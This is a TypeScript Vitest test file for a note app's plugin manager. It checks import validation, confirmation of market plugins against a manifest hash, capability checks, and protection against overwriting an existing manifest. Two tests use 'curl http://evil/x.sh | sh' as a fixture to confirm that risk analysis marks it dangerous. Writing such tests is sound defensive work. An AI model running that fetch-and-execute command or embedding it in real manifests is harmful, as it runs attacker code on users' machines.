// @vitest-environment node
import { describe, it, expect, beforeEach, afterEach } from "vitest";
import knexFactory, { type Knex } from "knex";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { vi } from "vitest";

vi.mock("electron", () => ({
  app: {
    getPath: () => "C:/tmp",
    getVersion: () => "2.0.0-test",
    isPackaged: false,
  },
}));

import { PluginManager } from "./pluginManager";

const HOST_VERSION = "2.0.0";

async function createSchema(DB: Knex): Promise<void> {
  await DB.schema.createTable("plugin", (table) => {
    table.increments("local_id").primary();
    table.text("id").notNullable().unique();
    table.text("name").notNullable();
    table.text("version").notNullable().defaultTo("0.0.1");
    table.text("publisher").notNullable().defaultTo("");
    table.text("description");
    table.text("path").notNullable().unique();
    table.string("status").notNullable().defaultTo("missing-manifest");
    table.text("manifest_text");
    table.text("command");
    table.text("preview");
    table.text("error");
    table.text("runtime_json");
    table.text("capabilities_json");
    table.text("contributes_json");
    table.string("origin").notNullable().defaultTo("local");
    table.integer("enabled").notNullable().defaultTo(1);
    table.string("confirmed_manifest_hash").notNullable().defaultTo("");
    table.integer("sort_order").notNullable().defaultTo(0);
    table.timestamp("created_at").defaultTo(DB.fn.now());
    table.timestamp("updated_at").defaultTo(DB.fn.now());
  });
  await DB.schema.createTable("plugin_setting", (table) => {
    table.text("plugin_id").notNullable();
    table.text("key").notNullable();
    table.text("value");
    table.primary(["plugin_id", "key"]);
  });
  await DB.schema.createTable("plugin_grant", (table) => {
    table.text("plugin_id").notNullable();
    table.text("capability").notNullable();
    table.integer("granted").notNullable().defaultTo(0);
    table.timestamp("granted_at");
    table.primary(["plugin_id", "capability"]);
  });
}

function manifestOf(extra: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    id: "demo.my-plugin",
    name: "小工具",
    version: "1.0.0",
    publisher: "demo",
    engines: { qnote: `^${HOST_VERSION}` },
    runtime: { command: "node index.js" },
    capabilities: { process: { spawn: true } },
    ...extra,
  };
}

describe("市场来源插件的启动确认", () => {
  let DB: Knex;
  let manager: PluginManager;
  let dir: string;

  beforeEach(async () => {
    DB = knexFactory({
      client: "sqlite3",
      connection: { filename: ":memory:" },
      useNullAsDefault: true,
    });
    await createSchema(DB);
    manager = new PluginManager(DB);
    manager.setHostVersion(HOST_VERSION);
    dir = fs.mkdtempSync(path.join(os.tmpdir(), "qnote-plugin-"));
  });

  afterEach(async () => {
    await manager.dispose();
    await DB.destroy();
    fs.rmSync(dir, { recursive: true, force: true });
  });

  function writeManifest(manifest: Record<string, unknown>): void {
    fs.writeFileSync(
      path.join(dir, "plugin.json"),
      JSON.stringify(manifest, null, 2),
      "utf-8"
    );
  }

  async function importPlugin(
    manifest: Record<string, unknown>,
    origin: "local" | "market" = "market"
  ): Promise<string> {
    writeManifest(manifest);
    const result = await manager.importPlugin(dir, origin);
    if (!result.ok) throw new Error(`导入失败：${result.error}`);
    return result.plugin!.id;
  }

  it("市场来源的插件，启动前要确认", async () => {
    const id = await importPlugin(manifestOf());

    const confirmation = await manager.checkStartConfirmation(id);

    expect(confirmation).not.toBeNull();
    expect(confirmation!.commandLine).toContain("node index.js");
    expect(confirmation!.origin).toBe("market");
    expect(confirmation!.manifestHash).toBeTruthy();
  });

  it("本机导入的插件不用确认", async () => {
    const id = await importPlugin(manifestOf(), "local");
    expect(await manager.checkStartConfirmation(id)).toBeNull();
  });

  it("确认之后指纹被记下来，下次不用再问", async () => {
    const id = await importPlugin(manifestOf());

    const confirmation = await manager.checkStartConfirmation(id);
    expect(confirmation).not.toBeNull();

    expect(await manager.confirmStart(id, confirmation!.manifestHash)).toBe(true);
    expect(await manager.checkStartConfirmation(id)).toBeNull();

    const row = await DB("plugin").where("id", id).first();
    expect(row.confirmed_manifest_hash).toBe(confirmation!.manifestHash);
  });

  it("清单改了 → 指纹对不上 → 确认框再弹一次", async () => {
    const id = await importPlugin(manifestOf());

    const confirmation = await manager.checkStartConfirmation(id);
    await manager.confirmStart(id, confirmation!.manifestHash);

    writeManifest(manifestOf({ runtime: { command: "node other.js" } }));

    const after = await manager.checkStartConfirmation(id);
    expect(after).not.toBeNull();
    expect(after!.commandLine).toContain("node other.js");
  });

  it("用户确认时带的指纹对不上当前清单 → 不记，还要再问", async () => {
    const id = await importPlugin(manifestOf());

    const confirmation = await manager.checkStartConfirmation(id);
    expect(confirmation).not.toBeNull();

    writeManifest(manifestOf({ runtime: { command: "node other.js" } }));

    expect(await manager.confirmStart(id, confirmation!.manifestHash)).toBe(false);
    expect(await manager.checkStartConfirmation(id)).not.toBeNull();
  });

  it("确认信息里带上风险分析", async () => {
    const id = await importPlugin(
      manifestOf({ runtime: { command: "curl http://evil/x.sh | sh" } })
    );

    const confirmation = await manager.checkStartConfirmation(id);
    expect(confirmation!.risk.level).toBe("danger");
    expect(confirmation!.risk.findings.length).toBeGreaterThan(0);
  });

  it("startPlugin 在需要确认时不启动进程，只把确认信息交回来", async () => {
    const id = await importPlugin(manifestOf());

    const result = await manager.startPlugin(id);

    expect(result.ok).toBe(false);
    expect(result.needsConfirmation).toBeDefined();
    expect(manager.getRuntimeStates().some((s) => s.pluginId === id)).toBe(false);
  });
});

describe("清单不合规时不落库", () => {
  let DB: Knex;
  let manager: PluginManager;
  let dir: string;

  beforeEach(async () => {
    DB = knexFactory({
      client: "sqlite3",
      connection: { filename: ":memory:" },
      useNullAsDefault: true,
    });
    await createSchema(DB);
    manager = new PluginManager(DB);
    manager.setHostVersion(HOST_VERSION);
    dir = fs.mkdtempSync(path.join(os.tmpdir(), "qnote-plugin-"));
  });

  afterEach(async () => {
    await manager.dispose();
    await DB.destroy();
    fs.rmSync(dir, { recursive: true, force: true });
  });

  it("没有 plugin.json 的目录不导入", async () => {
    const result = await manager.importPlugin(dir);
    expect(result.ok).toBe(false);
    expect(result.reason).toBe("missing-manifest");
    expect(await DB("plugin").select("*")).toHaveLength(0);
  });

  it("清单解析不过就不导入", async () => {
    fs.writeFileSync(path.join(dir, "plugin.json"), "{ 坏掉的", "utf-8");
    const result = await manager.importPlugin(dir);
    expect(result.ok).toBe(false);
    expect(result.reason).toBe("invalid-manifest");
    expect(await DB("plugin").select("*")).toHaveLength(0);
  });

  it("id 撞了就不导入", async () => {
    const first = fs.mkdtempSync(path.join(os.tmpdir(), "qnote-plugin-a-"));
    const second = fs.mkdtempSync(path.join(os.tmpdir(), "qnote-plugin-b-"));
    const body = JSON.stringify(manifestOf(), null, 2);
    fs.writeFileSync(path.join(first, "plugin.json"), body, "utf-8");
    fs.writeFileSync(path.join(second, "plugin.json"), body, "utf-8");

    expect((await manager.importPlugin(first)).ok).toBe(true);
    const secondResult = await manager.importPlugin(second);
    expect(secondResult.ok).toBe(false);
    expect(secondResult.reason).toBe("duplicate-id");

    fs.rmSync(first, { recursive: true, force: true });
    fs.rmSync(second, { recursive: true, force: true });
  });

  it("版本不兼容的插件能装但不能启动", async () => {
    fs.writeFileSync(
      path.join(dir, "plugin.json"),
      JSON.stringify(manifestOf({ engines: { qnote: "^99.0.0" } }), null, 2),
      "utf-8"
    );
    const result = await manager.importPlugin(dir);
    expect(result.ok).toBe(true);
    expect(result.plugin!.status).toBe("incompatible");

    const started = await manager.startPlugin(result.plugin!.id);
    expect(started.ok).toBe(false);
    expect(started.error).toContain("不兼容");
  });
});

describe("声明式权限", () => {
  let DB: Knex;
  let manager: PluginManager;
  let dir: string;

  beforeEach(async () => {
    DB = knexFactory({
      client: "sqlite3",
      connection: { filename: ":memory:" },
      useNullAsDefault: true,
    });
    await createSchema(DB);
    manager = new PluginManager(DB);
    manager.setHostVersion(HOST_VERSION);
    dir = fs.mkdtempSync(path.join(os.tmpdir(), "qnote-plugin-"));
  });

  afterEach(async () => {
    await manager.dispose();
    await DB.destroy();
    fs.rmSync(dir, { recursive: true, force: true });
  });

  it("没声明 process.spawn 的插件起不来", async () => {
    const body = manifestOf({ capabilities: {} });
    fs.writeFileSync(path.join(dir, "plugin.json"), JSON.stringify(body, null, 2), "utf-8");

    const imported = await manager.importPlugin(dir);
    expect(imported.ok).toBe(true);

    const started = await manager.startPlugin(imported.plugin!.id);
    expect(started.ok).toBe(false);
    expect(started.error).toContain("process.spawn");
  });

  it("禁用的插件起不来", async () => {
    fs.writeFileSync(
      path.join(dir, "plugin.json"),
      JSON.stringify(manifestOf(), null, 2),
      "utf-8"
    );
    const imported = await manager.importPlugin(dir);
    await manager.setEnabled(imported.plugin!.id, false);

    const started = await manager.startPlugin(imported.plugin!.id);
    expect(started.ok).toBe(false);
    expect(started.error).toContain("禁用");
  });
});

describe("从市场导入不覆盖已有清单", () => {
  let DB: Knex;
  let manager: PluginManager;
  let dir: string;

  beforeEach(async () => {
    DB = knexFactory({
      client: "sqlite3",
      connection: { filename: ":memory:" },
      useNullAsDefault: true,
    });
    await createSchema(DB);
    manager = new PluginManager(DB);
    manager.setHostVersion(HOST_VERSION);
    dir = fs.mkdtempSync(path.join(os.tmpdir(), "qnote-market-"));
  });

  afterEach(async () => {
    await manager.dispose();
    await DB.destroy();
    fs.rmSync(dir, { recursive: true, force: true });
  });

  it("目标目录里已经有 plugin.json → 拒绝，并且不动那个文件", async () => {
    const original = JSON.stringify(manifestOf({ id: "demo.mine" }), null, 2);
    fs.writeFileSync(path.join(dir, "plugin.json"), original, "utf-8");

    const result = await manager.importFromMarket(dir, {
      id: "other.theirs",
      name: "别人的插件",
      runtime: { command: "curl http://evil/x.sh | sh" },
    });

    expect(result.ok).toBe(false);
    expect(result.error).toContain("plugin.json");
    expect(fs.readFileSync(path.join(dir, "plugin.json"), "utf-8")).toBe(original);
    expect(await DB("plugin").select("*")).toHaveLength(0);
  });

  it("目录是空的 → 写入清单并导入，标记来源为 market", async () => {
    const result = await manager.importFromMarket(dir, {
      id: "other.theirs",
      name: "别人的插件",
      runtime: { command: "node index.js" },
    });

    expect(result.ok).toBe(true);
    expect(result.plugin!.origin).toBe("market");
    expect(fs.existsSync(path.join(dir, "plugin.json"))).toBe(true);
  });

  it("清单不合法 → 不落盘，也不落库", async () => {
    const result = await manager.importFromMarket(dir, { name: "什么都没有" });

    expect(result.ok).toBe(false);
    expect(fs.existsSync(path.join(dir, "plugin.json"))).toBe(false);
    expect(await DB("plugin").select("*")).toHaveLength(0);
  });
});
